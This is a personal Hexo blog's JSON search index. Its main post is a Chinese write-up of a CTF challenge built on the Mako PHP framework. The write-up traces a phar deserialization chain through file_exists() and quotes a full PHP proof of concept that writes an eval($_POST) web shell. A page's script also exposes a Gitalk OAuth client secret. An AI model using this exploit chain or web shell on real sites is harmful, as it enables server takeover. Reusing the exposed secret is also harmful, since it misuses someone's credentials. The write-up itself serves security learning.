{"pages":[{"title":"","text":"个人简介 二次元 - 追番列表(部分) OVERLORD Lycoris Recoil 紫罗兰永恒花园 可塑性记忆 齐木楠雄的灾难 虚构推理 奇蛋物语 因为太怕痛就全点防御力了 转生成蜘蛛又怎样 打工吧魔王大人 青春猪头少年不会梦到兔女郎学姐 现实主义勇者的王国再建记 刀剑神域 某科学的超电磁炮 回复术士的重启人生 缘()空 ReLIFE JoJo的奇妙冒险 这个治疗有点烦 间谍过家家 辉夜大小姐想让我告白 盾之勇者成名录 约会大作战 理科生坠入情网故试图证明 处刑少女的生存之道 五等分的新娘 月光下的异世界之旅 魔法禁书目录 四月是你的谎言 小林家的龙女仆 星之梦 工作细胞BLACK 工作细胞 自称贤者弟子的贤者 与变成了异世界美少女的好友一起冒险 天才王子的赤字国家振兴术 公主连结 失格纹的最强贤者 见面5秒开始战斗 甘城光辉游乐园 某科学的超电磁炮 某科学的一方通行 魔法禁书目录 异度侵入 ID：INVADED 好比是最终迷宫前的少年到新手村生活一般的故事 魔王勇者 邻家索菲 入间同学入魔了 异世界迷宫黑心企业 我立于百万生命之上 关于我转生变成史莱姆这档事 精灵幻想记 侦探已死 碧蓝之海 丹特丽安的书架 从零开始的魔法书 魔女之旅 圣女魔力无所不能 RE：创造主 Dr.STONE 石纪元 被神捡到的男人 22/7 动物新时代 / BNA 这个勇者明明很强却过分慎重 我，不是说了能力要平均值吗 SSSS","link":"/about/index.html"},{"title":"","text":"你似乎来到了世界的尽头","link":"/album/index.html"},{"title":"","text":"&nbsp;&nbsp;听听音乐 音乐播放器由mePlayer提供，布局参照网友博客所作，感谢作者的辛勤付出。更多音乐分享请查看歌单。 &nbsp;&nbsp;看看视频 ->点击以下条目开始播放视频,向下滑动查看更多","link":"/media/index.html"},{"title":"","text":"友情链接还没挂，嘻嘻","link":"/friend/index.html"},{"title":"","text":"来而不往非礼也畅所欲言，有留必应","link":"/message/index.html"},{"title":"","text":"碎碎念 tips：github登录后按时间正序查看、可点赞加❤️、本插件地址..「+99次查看」 碎碎念加载中，请稍等... $.getScript(\"/js/gitalk_self.min.js\", function () { var gitalk = new Gitalk({ clientID: '46a9f3481b46ea0129d8', clientSecret: '79c7c9cb847e141757d7864453bcbf89f0655b24', id: '666666', repo: 'issue_database', owner: 'removeif', admin: \"removeif\", createIssueManually: true, distractionFreeMode: false }); gitalk.render('comment-container1'); });","link":"/self-talking/index.html"},{"title":"音乐歌单收藏","text":"温馨提示：选择喜欢的音乐双击播放，由于版权原因部分不能播放。如果喜欢歌单收藏一下，去网易云都能播放哟！","link":"/music/index.html"}],"posts":[{"title":"美团CTF决赛复现 mako","text":"太菜了，被大佬带进决赛了,最后就签个到 环境密码:1skr 下面部分是我在比赛的时候思考过的 1.开始页面一进来，十分的清爽，毛都没有，就一个上传文件的东西 随便传点东西，发现是来者不拒，啥都能传，但啥都干不了访问1.php只会出现404not found这是最令人异或的一点 因为题目给了docker，就本地部署一个环境，先进去看看文件都存到了哪里可以看见，文件并没有被上传到/var/www/html/这个目录下面 而文件被上传到了/var/www/html/mako/uploads这个目录下 可以肯定的是，文件上传是整不了活了 2.审计通过搜索关键词，在mako/app/reources/views/home.tpl.php里找到到了首页的源码 很明显，这是用模版渲染出来的主页, 图片都是以base64的编码形式传递的，没活整了。 这就很令人苦恼，我当时尝试了一下，使用软链接 直接寄了，没权限，这时候才想起来容器一开始写了一个读取flag的程序 目标也明确了，肯定得想办法执行readFlag，于是我搜了危险函数，然后是一无所获，要么没这个函数，要么根本无法触发 做到这里，我已经没有思路了，当时想到了反序列化，但是只知道搜unseralize，结果是毛都没搜到。 我经验太少了，当时没想到用phar 3.复现在mako/app/controllers/ImagesController.php文件中 123456789public function editGet(ViewFactory $view): string { chdir('/var/www/mako/uploads'); $fileName = $this-&gt;request-&gt;getQuery()-&gt;get('filename'); $image = new Image($fileName, new ImageMagick()); $dimensions = $image-&gt;getDimensions(); $this-&gt;view-&gt;assign('fileName', $fileName); $this-&gt;view-&gt;assign('dimensions', $dimensions); return $view-&gt;render('edit');} 可以看到，文件名是不做任何过滤的 而在mako/vendo/mako/framework/src/mako/pixl/image.php中 1234567891011121314151617public function __construct($image, ProcessorInterface $processor){ $this-&gt;image = $image; $this-&gt;processor = $processor; // Make sure that the image exists if(file_exists($this-&gt;image) === false) { throw new PixlException(vsprintf('The image [ %s ] does not exist.', [$this-&gt;image])); } // Set the image $this-&gt;processor-&gt;open($image);} 使用了能触发phar反序列化的file_exists函数 关键函数找到了，现在找链子吧 搜索__destruct(),干扰项不多，可以直接开撸 好家伙，我直接好家伙，一条龙服务了属于是qwq 4.攻击这里搬一手Arr3stY0u战队的poc吧 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phpnamespace mako\\file{class FileSystem{}}namespace mako\\session\\stores{ use mako\\file\\FileSystem;class File{ protected $fileSystem; protected $sessionPath; public function __construct(){ $this-&gt;fileSystem = new FileSystem(); $this-&gt;sessionPath = '/var/www/mako/public/'; }}}namespace mako\\session{use mako\\session\\stores\\File;class Session{ protected $autoCommit; protected $destroyed = false; protected $sessionId; protected $sessionData = []; protected $store; public function __construct(){ $this-&gt;autoCommit = true; $this-&gt;destroyed = false; $this-&gt;store = new File(); $this-&gt;sessionId = 'shell.php'; $this-&gt;sessionData = ['a'=&gt;'&lt;?php eval($_POST[1]);?&gt;']; }}}namespace { $exp = new mako\\session\\Session(); $phar = new Phar('test.phar',0,'test.phar'); $phar-&gt;startBuffering(); $phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ?&gt;'); $phar-&gt;setMetadata($exp); $phar-&gt;addFromString('text.txt','test'); $phar-&gt;stopBuffering();}; 上传文件getshellflag is here 5.总结反思经验不足，做题不够，欠练","link":"/2022/09/30/mt-ctf/"},{"title":"How sfc9982 helped me solve hexo problem","text":"How sfc9982 helped me solve hexo problem I used removeif/hexo-theme-amazing He STFW and RTFM then he solved it. I deeply apperciate his generous assistance.His blog is at googles.plus","link":"/2022/09/29/i-love-hexo/"}],"tags":[{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"WEB","slug":"WEB","link":"/tags/WEB/"},{"name":"复现","slug":"复现","link":"/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"反序列化","slug":"反序列化","link":"/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"phar","slug":"phar","link":"/tags/phar/"},{"name":"Hexo","slug":"Hexo","link":"/tags/Hexo/"},{"name":"Troubleshooting","slug":"Troubleshooting","link":"/tags/Troubleshooting/"}],"categories":[]}